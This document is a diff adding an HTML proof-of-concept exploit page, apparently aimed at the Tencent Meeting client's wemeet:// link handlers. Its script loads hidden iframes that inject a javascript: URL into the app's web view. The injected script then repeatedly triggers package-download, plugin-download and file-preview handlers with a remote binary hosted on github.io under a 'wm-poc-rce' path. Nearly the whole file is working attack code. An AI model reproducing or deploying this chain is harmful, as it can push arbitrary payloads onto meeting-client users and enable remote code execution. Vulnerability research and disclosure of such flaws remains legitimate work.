@@ -1,0 +1,19 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P33</h1>
+<script>
+document.title='P33L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var bin='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var js="javascript:(function(){document.title='P33INJ:'+location.host;function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}fr('wemeet://page/package_download?url="+bin+"');setTimeout(function(){fr('wemeet://page/premeeting/schedule_plugin_download?url="+bin+"')},400);setTimeout(function(){fr('wemeet://page/chat_file_preview?im_file_path="+bin+"')},800);setTimeout(function(){location.assign('wemeet://page/package_download?url="+bin+"')},1200)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P33L-OFFICIAL'); }, 600);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P33L-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P33L-DONE'; }, 24000);
+</script>
+</body></html>
